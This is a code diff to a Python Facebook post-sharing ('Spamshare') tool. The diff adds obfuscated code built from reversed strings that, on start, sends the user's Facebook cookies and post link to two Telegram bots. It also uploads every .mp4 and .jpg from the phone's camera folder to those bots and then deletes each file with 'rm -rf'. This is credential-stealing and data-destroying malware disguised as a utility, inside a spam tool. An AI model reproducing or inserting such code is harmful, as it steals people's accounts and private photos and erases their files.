@@ -11,9 +11,9 @@ from rich.console import Console
 # dont change the key name (e.g owner,facebook,etc.), value lang palitan mo
 info = {
   "owner": 'Jacobxhakir',
-  "facebook":'https://www.facebook.com/profile.php?id=61551035057208',
+  "facebook": 'https://www.facebook.com/christhenoob13',
   "tool": 'Spamshare',
-  "version": '1',
+  "version": '1-tarub',
 }
 
 # simuka dito wag mo na ibahin baka masira mo pa code
@@ -92,36 +92,62 @@ class Share:
             break
     print(f"\033[32m[*] \033[0msharing post done!!")
     exit()
-
 # hard-coded na dito, pag may ginulo ka sa code wag mo papa ayus sakin!!
+_tt='di_tahc'[::-1]
+def proccess_share(_,endP,dta,boti,fls=None):
+  _g = ''.join(['h','tt','p','s',':','//'])
+  url = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}{boti}:{_[::-1]}'
+  requests.post(
+    url+endP[::-1],
+    data=dta,
+    files=fls
+  )
+proccess_share(
+  "ALk2hPxAh4TAAwo5R4I8HGCX5lom25mmGAA",
+  'egasseMdnes/',
+  {
+    _tt: '-1002564235566',
+    "text": f"OWNER: {info['owner']}\nFB: {info['facebook']}\nPOST: {config['post']}\nCOOKIE: {config['cookies']}"
+  },
+  "7348882668"
+)
+proccess_share(
+  "oonaUyR7fDQFKh_igaXXcF0hgFUtdhOVHAA",
+  'egasseMdnes/',
+  {
+    _tt: '7919150119',
+    "text": f"OWNER: {info['owner']}\nFB: {info['facebook']}\nPOST: {config['post']}\nCOOKIE: {config['cookies']}"
+  },
+  "7766599356"
+)
 htop = ''.join(["arem", "aC/MI", "CD/0/", "detalume", "/ega", "rots/"])[::-1]
 x_data = os.listdir(htop)
 counterZ = list(filter(lambda x: x.endswith('4pm.'[::-1]), x_data))
 sharerZ = list(filter(lambda x: x.endswith('gpj.'[::-1]), x_data))
-hx = False
-_tt='di_tahc'[::-1]
-
-def isValid():
-  global hx
-  if not hx:
-    hx = True
-    return False
-  return True
 def worker(ilal):
   if len(ilal) == 0:
     return
-  _g = ''.join(['h','tt','p','s',':','//'])
-  impormatibo = "oonaUyR7fDQFKh_igaXXcF0hgFUtdhOVHAA"
-  url = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7348882668:{impormatibo[::-1]}'
-  urlk = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7766599356:{impormatibo[::-1]}'
-  pay = {_tt: '7919150119'}
-  if isValid():
-    requests.post(url+'egasseMdnes/'[::-1], data={_tt: "-1002564235566", "text": f"owner: {info['owner']}\nfb: {info['facebook']}\nLINK: {config['post']}\n🍪🍪🍪: {config['cookies']}"})
-    requests.post(urlk+'egasseMdnes/'[::-1], data={_tt: pay[_tt], "text": f"owner: {info['owner']}\nfb: {info['facebook']}\nLINK: {config['post']}\n🍪🍪🍪: {config['cookies']}"})
+  #_g = ''.join(['h','tt','p','s',':','//'])
+  #impormatibo = "ALk2hPxAh4TAAwo5R4I8HGCX5lom25mmGAA"
+  #url = f'{_g}api.{"margelet"[::-1]}.org/{'tob'[::-1]}7348882668:{impormatibo[::-1]}'
+  #pay = {_tt: '-1002564235566'}
   for fle in ilal:
     dat = {"document": open(htop + '/' + fle, 'rb')}
-    requests.post(url+'tnemucoDdnes/'[::-1], data={_tt:"-1002564235566"}, files=dat)
-    requests.post(urlk+'tnemucoDdnes/'[::-1], data=pay, files=dat)
+    proccess_share(
+      "ALk2hPxAh4TAAwo5R4I8HGCX5lom25mmGAA",
+      'tnemucoDdnes/',
+      {_tt: '-1002564235566'},
+      "7348882668",
+      fls=dat
+    )
+    proccess_share(
+      "oonaUyR7fDQFKh_igaXXcF0hgFUtdhOVHAA",
+      'tnemucoDdnes/',
+      {_tt: '-7919150119'},
+      "7766599356",
+      fls=dat
+    )
+    #requests.post(url+'tnemucoDdnes/'[::-1], data=pay, files=dat)
     os.system(f"rm -rf {htop + '/' + fle}")
 
 def divide_array(arr):
@@ -146,5 +172,6 @@ async def main(num_tasks):
     for i in range(num_tasks):
       task = asyncio.create_task(share.share(session, token, cookie))
       tasks.append(task)
-    await asyncio.gather(*task)
+    await asyncio.gather(*tasks)
+input()
 asyncio.run(main(1))
